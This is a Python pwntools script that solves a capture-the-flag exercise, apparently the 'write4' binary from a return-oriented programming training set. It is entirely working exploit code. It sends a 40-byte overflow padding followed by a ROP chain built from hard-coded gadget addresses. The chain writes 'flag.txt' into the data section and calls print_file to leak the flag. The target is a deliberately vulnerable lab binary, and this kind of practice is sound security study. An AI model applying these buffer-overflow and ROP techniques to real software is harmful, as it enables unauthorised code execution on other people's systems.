from pwn import *

BINARY = "./write4"
ELF = ELF(BINARY)

context.os = "linux"
context.arch = "amd64"
context.binary = BINARY

p = process(BINARY)

data_adr        = p64(0x601028)
mov_ptr_r14_r15 = p64(0x400628) # mov QWORD PTR [r14], r15; ret;
pop_r14_pop_r15 = p64(0x400690) # pop r14; pop r15; ret;
pop_rdi         = p64(0x400693) # pop rdi; ret;

rop = b"A" * 40

# Putting data_adr in r14 and "flag.txt" in r15
rop += pop_r14_pop_r15
rop += data_adr
rop += b"flag.txt"

# Moving "flag.txt" into data section
rop += mov_ptr_r14_r15

# print_file(data_adr) --> print_file("flag.txt")
rop += pop_rdi
rop += data_adr
rop += p64(ELF.symbols['print_file'])

log.success(f"ROP chain : {rop}")
p.sendline(rop)

flag = p.recvall().split(b'\n')[-2]
log.success(f"FLAG : {flag}")
